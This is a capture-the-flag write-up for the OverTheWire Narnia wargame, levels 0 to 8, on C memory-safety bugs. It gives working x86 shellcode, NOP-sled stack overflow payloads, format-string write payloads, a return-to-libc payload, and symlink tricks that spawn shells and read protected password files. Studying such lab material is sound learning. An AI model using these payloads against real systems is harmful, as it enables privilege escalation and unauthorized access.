### overthewire - narnia (clang exploits)
narnia levels concerns basic c language exploits. these exploits are mainly due to bad memory safety in c. 

0. simple stack overflow
    * memory layout: low_addr ... buf val ... high_addr
    * > ```(python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0```
        * copying from clipboard is not going to work, so regrouping statements and pipe must be used
        * when in doubt, use python and pipe to write exploit strings, partly due to the low write priviledge given
    * idea from [here](https://axcheron.github.io/writeups/otw/narnia/)
---
1. environment variable exploit
    * apparently the program tries to execute the environment variable EGG
    * so set EGG to shellcode 
    * > ```export EGG=\`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'\` ```
    * > ```/narnia/narnia1```
---
2. standard buffer overflow
    * see 'smashing the stack for fun and profit'
    * common gdb plays
        * intro
            * ```gdb <executable>``` to launch gnu debugger
            * ```r <arguments>``` to run program
            * ```n``` to execute the next line
            * ```l``` to look around the current line, if high level code avaliable
            * ```i r``` to look at all registers
            * ```q``` to quit
        * disassembly
            * oftentimes we can only see assembly code
            * ```set disassembly-flavor intel``` before anything
            * ```disass main``` shorthand for disassembling the main function
        * breakpoints
            * just like other breakpoints in other IDEs
            * ```b main``` to set breakpoint at main
            * ```b *main+10``` to set breakpoint at 10 bytes after main
            * ```i b``` lists (info) breakpoints
            * ```d b 1``` deletes the first breakpoint, if it exists
            * ```c``` during program execution continues to the next breakpoint or program's end
    * address arithmetic
        * memory layout (see the paper above)
        * key: 8 + $ebp is return address
            * 4 + $ebp is the caller's $ebp, for main it is 0
    * exploit sandwitch
        * a series of moves to get the program's permmission
        * ```sandwitch = NOP (\x90) sled + shell code + fake_ret```
        * ```fake_ret``` points to somewhere in the NOP sled
            * program will no exactly nothing as it slides down the NOP sled
            * then it will execute the shell code to spawn a shell with process priviledge for attacker
        * length of the sandwitch must align with the program's data structure
            * through gdb examination, 132 bytes of NOP + shell code and then return to NOP sled
                * ```disas main```
                    * recon(nissance) by disas(sembling) main to see where is ```strcpy```
                * ```b *main+56```
                    * set a breakpoint right after ```strcpy``` 
                * use ```x/100x $esp+500```
                    * ```x/100x``` means 'print in hex 100 bytes after the specified location'
                    * ```$esp+500``` means 'location is stack top plus 500'
                        * note this goes against the direction of stack and reaches the environment variable, ```argv[1]``` we supplied 
                            * this is because like narnia1, we want to run shell code in the environment, as memory will be recycled after ```main``` returns
                        * 500 is an estimate of the distance from the stack to the environment variable, which sits at the high end of memory
                * remember above main's stack is the last $ebp (in this case 0) and then the return address
                * a little trial and error
            * length of shell code is 45
                * > "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
            * NOP sled is ```132 - 27 = 87``` bytes long
    * > ```/narnia/narnia2 $(python -c 'print "\x90"*87 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x64\xd8\xff\xff"')```
    * > ```cat /etc/narnia_pass/narnia3```
---
3. output redirection
    * idea is to redirect ofile to a file that we can see, and let ifile be narnia4's password
        * this is ```/tmp``` directory on narnia server
    * overflow ifile to get the desired result
    * how to implement
        * observe we cannot simply put ```/etc/narnia_pass/narnia4``` down as ifile and try to append whatever ofile in ```/tmp``` after it
        * solution: soft link
            * ```ln -s /etc/narnia_pass/narnia4 <some-file>``` 
        * observe if ```<some-file>``` needs to be ofile from 32 characters onward. let's call that ```/tmp/ifile``` and denote it ```B```
        * the first 32 characters must be valid file path, so we have to create some file that we have access to with an absolute path of 32 characters:
            * > ```mkdir -p /tmp/narnia4narnia4narnia4narnia/tmp```
            * denote ```/tmp/narnia4narnia4narnia4narnia``` as ```A```
        * link password to ```AB```
            * > ```ln -s /etc/narnia_pass/narnia4 /tmp/narnia4narnia4narnia4narnia/tmp/ifile```
        * make the actual file for storing password and make it avaliable for narnia3's program
            * > ```touch /tmp/ifile;chmod 666 /tmp/ifile```
        * run the program with ```AB``` as input and read password
            * > ```/narnia/narnia3 /tmp/narnia4narnia4narnia4narnia/tmp/ifile```
            * > ```cat /tmp/ifile```
        * note the similiarty between this level and leviathan2, both are related to the idea of quine
---
4. buffer overflow
    * very similar to narnia2
    * ```264 - 45 = 219``` bytes of NOP
    * one return address would be ```0xffffd888```
    * > ```/narnia/narnia4 $(python -c "print '\x90'*219+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x88\xd8\xff\xff'")```
---
5. vanilla format string
    * ```%p``` to read
        * ```a.out %p%p%p``` reads the first, second, and third argument on the stack (not secure!)
        * read the third argument: ```a.out %3%p```
    * ```$n``` to write
        * ```%1$n``` to write to the address in first argument on stack
        * this turns out to be the address for i in hint
        * the first argument in this case is the beginning of the attack string
    * ```%<rep>x``` to write
        * ```<rep>``` is the length of the string we want to write
    * solution sketch
        * we need to write the address in hint at first
        * we need the string before the ```%1$n``` to be interpreted as 500 bytes long
            * thus we want ```<rep>``` to be 496 since we've already used up 4 bytes
    * > ```/narnia/narnia5 $(python -c 'print "\xe0\xd6\xff\xff" + "%496x%1$n"')```
    * > ```cat /etc/narnia_pass/narnia5```
---
6. return-to-libc
    * note the small size of buffers elinimates the probability of cooking up a shell code
    * however, one can still call ```system``` function in libc
        * supply it with ```sh;``` argument
        * ```p system``` in gdb once program started running
    * > ```/narnia/narnia6 $(python -c 'print "sh;"+"ABCDE"+"\x50\xc8\xe4\xf7"+" FGHI"')```
---
7. format string + control flow redirect
    * we want to go to ```hackedfunction``` at ```0x8048724```
    * overwrite prtf by a format string vulnerability to achieve the goal
    * the address of prtf is the last hex number on its line, ```0xffffd638```
    * ```format``` is the second argument on stack
    * > ```/narnia/narnia7 $(python -c 'print "\x38\xd6\xff\xff" + "%134514464d%2$n"')```
    * > ```cat /etc/narnia_pass/narnia8```
---
8. string start vulnerability
    * this one is not fully solved by the following methods
    * it is 'solved' in gdb, but gdb spawns the program with priviledges of narnia8
    * so the following is how to get a shell in gdb
    * ```gdb /narnia/narnia8```
    * ```disas func```
        * observe there are two pointers to the string based on different arithmetic
        * if the ```func``` is to return smoothly, it must line up the two pointers after overflowing the string
        * return ```func``` to a preset envrionment variable that's shell code (see narnia1)
        * start address of input is subtracted by 12, since we need to overwrite the start address, another variable in bewteen, and the return address for func
        * encode everything in little-endian format
        * use ```x/16wx``` to see nearby memory
        * break at ```*func+106``` after the copying
        * use ```x/s *((char **)environ+6)``` to see the environment variable in gdb
